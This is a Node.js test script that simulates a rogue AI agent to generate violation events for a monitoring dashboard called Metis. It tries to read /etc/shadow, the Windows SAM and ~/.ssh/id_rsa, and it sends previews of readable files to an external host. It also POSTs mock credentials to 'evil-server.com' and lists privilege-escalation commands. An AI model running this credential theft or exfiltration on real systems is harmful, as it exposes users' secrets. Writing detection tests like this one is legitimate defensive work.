const fs = require('fs');
const path = require('path');
const https = require('https');

class UnauthorizedAIAgent {
    constructor() {
        this.agentId = 'test-unauthorized-agent-' + Date.now();
        this.agentName = 'Test Unauthorized AI Agent';
        this.metisEndpoint = 'https://aigs-mvp.onrender.com';
        this.violationCount = 0;
    }

    async reportViolation(actionType, severity, reason, details) {
        this.violationCount++;
        
        const violationData = {
            agent_id: this.agentId,
            agent_name: this.agentName,
            action_type: actionType,
            severity: severity,
            reason: reason,
            timestamp: new Date().toISOString(),
            details: details || {}
        };

        console.log(`🚨 VIOLATION ${this.violationCount}: ${reason}`);
        console.log(`   Type: ${actionType} | Severity: ${severity}`);
        console.log(`   Reporting to Metis...`);

        try {
            const response = await fetch(`${this.metisEndpoint}/violations`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'TestAIAgent/1.0'
                },
                body: JSON.stringify(violationData)
            });

            if (response.ok) {
                console.log(`   ✅ Reported successfully to Metis\n`);
            } else {
                console.log(`   ❌ Failed to report: HTTP ${response.status}\n`);
            }
        } catch (error) {
            console.log(`   ❌ Network error: ${error.message}\n`);
        }
    }

    async attemptUnauthorizedFileAccess() {
        console.log('🔍 Attempting unauthorized file access...');
        
        const sensitiveFiles = [
            '/etc/passwd',           // Unix/Linux password file
            '/etc/shadow',           // Unix/Linux shadow passwords
            'C:\\Windows\\System32\\SAM',  // Windows security database
            '/Users/Shared',         // Shared user directory
            process.env.HOME + '/.ssh/id_rsa'  // SSH private key
        ];

        for (const filePath of sensitiveFiles) {
            try {
                // Attempt to access file
                await fs.promises.access(filePath, fs.constants.R_OK);
                
                // If successful, report as HIGH severity violation
                await this.reportViolation(
                    'unauthorized_file_access',
                    'HIGH',
                    `Agent successfully accessed restricted system file: ${filePath}`,
                    { 
                        filePath: filePath,
                        fileType: 'system_critical',
                        accessTime: new Date().toISOString(),
                        outcome: 'success'
                    }
                );
                
                // Try to read a small portion (safely)
                try {
                    const data = await fs.promises.readFile(filePath, { encoding: 'utf8' });
                    const preview = data.substring(0, 50) + '...';
                    
                    await this.reportViolation(
                        'unauthorized_data_read',
                        'CRITICAL',
                        `Agent read sensitive data from ${filePath}`,
                        {
                            filePath: filePath,
                            dataPreview: preview,
                            bytesRead: data.length
                        }
                    );
                } catch (readError) {
                    // File exists but can't read - still a violation
                    await this.reportViolation(
                        'unauthorized_access_attempt',
                        'MEDIUM',
                        `Agent accessed ${filePath} but couldn't read contents`,
                        { filePath: filePath, error: readError.code }
                    );
                }
                
            } catch (accessError) {
                // File doesn't exist or no permission - report as attempted violation
                await this.reportViolation(
                    'unauthorized_access_blocked',
                    'LOW',
                    `Agent attempt to access ${filePath} was blocked by system`,
                    { 
                        filePath: filePath,
                        blockReason: accessError.code,
                        outcome: 'blocked'
                    }
                );
            }
        }
    }

    async attemptUnauthorizedNetworkAccess() {
        console.log('🌐 Attempting unauthorized network access...');
        
        const restrictedEndpoints = [
            'https://api.github.com/user',
            'https://www.google.com/gmail',
            'https://admin.company.com/users',
            'http://localhost:3306/mysql',
            'https://api.stripe.com/v1/customers'
        ];

        for (const endpoint of restrictedEndpoints) {
            try {
                console.log(`   Trying to access: ${endpoint}`);
                
                const response = await fetch(endpoint, {
                    method: 'GET',
                    headers: {
                        'User-Agent': 'UnauthorizedAIAgent/1.0'
                    }
                });

                await this.reportViolation(
                    'unauthorized_network_access',
                    'HIGH',
                    `Agent made unauthorized request to restricted endpoint: ${endpoint}`,
                    {
                        endpoint: endpoint,
                        responseStatus: response.status,
                        method: 'GET',
                        outcome: 'request_sent'
                    }
                );

            } catch (networkError) {
                await this.reportViolation(
                    'unauthorized_network_attempt',
                    'MEDIUM',
                    `Agent attempted unauthorized network access to ${endpoint}`,
                    {
                        endpoint: endpoint,
                        error: networkError.message,
                        outcome: 'blocked_or_failed'
                    }
                );
            }
        }
    }

    async attemptDataExfiltration() {
        console.log('📤 Attempting data exfiltration...');
        
        // Simulate finding and attempting to exfiltrate sensitive data
        const mockSensitiveData = {
            customerEmails: ['john@company.com', 'sarah@company.com'],
            apiKeys: ['sk-proj-abc123...', 'pk_live_def456...'],
            passwords: ['admin123', 'password'],
            creditCards: ['4532-****-****-1234', '5555-****-****-4444']
        };

        await this.reportViolation(
            'data_exfiltration_attempt',
            'CRITICAL',
            'Agent attempted to exfiltrate sensitive customer data',
            {
                dataTypes: Object.keys(mockSensitiveData),
                recordCount: Object.values(mockSensitiveData).flat().length,
                exfiltrationMethod: 'external_api_upload',
                detectionTime: new Date().toISOString()
            }
        );

        // Attempt to send data to external endpoint
        try {
            await fetch('https://evil-server.com/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mockSensitiveData)
            });
        } catch (error) {
            await this.reportViolation(
                'blocked_exfiltration',
                'HIGH',
                'Data exfiltration attempt was blocked',
                {
                    targetEndpoint: 'https://evil-server.com/upload',
                    blockReason: 'network_security',
                    dataProtected: true
                }
            );
        }
    }

    async attemptPrivilegeEscalation() {
        console.log('⬆️ Attempting privilege escalation...');
        
        const escalationCommands = [
            'sudo su -',
            'chmod 777 /etc/passwd',
            'net user administrator password123',
            'docker run --privileged',
            'kubectl get secrets --all-namespaces'
        ];

        for (const command of escalationCommands) {
            await this.reportViolation(
                'privilege_escalation_attempt',
                'CRITICAL',
                `Agent attempted privilege escalation with command: ${command}`,
                {
                    command: command,
                    attemptTime: new Date().toISOString(),
                    riskLevel: 'system_compromise'
                }
            );
        }
    }

    async runTestSequence() {
        console.log(`\n🤖 STARTING AI AGENT UNAUTHORIZED ACTIVITY TEST`);
        console.log(`Agent ID: ${this.agentId}`);
        console.log(`Target: ${this.metisEndpoint}`);
        console.log(`Time: ${new Date().toISOString()}\n`);

        try {
            // Run unauthorized activities
            await this.attemptUnauthorizedFileAccess();
            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds
            
            await this.attemptUnauthorizedNetworkAccess();
            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds
            
            await this.attemptDataExfiltration();
            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds
            
            await this.attemptPrivilegeEscalation();

            console.log(`\n✅ TEST SEQUENCE COMPLETE`);
            console.log(`Total violations generated: ${this.violationCount}`);
            console.log(`Check your Metis dashboard for real-time violations!\n`);
            
        } catch (error) {
            console.error(`❌ Test sequence failed: ${error.message}`);
        }
    }
}

// Run the test if this file is executed directly
if (require.main === module) {
    const agent = new UnauthorizedAIAgent();
    agent.runTestSequence();
}

module.exports = UnauthorizedAIAgent;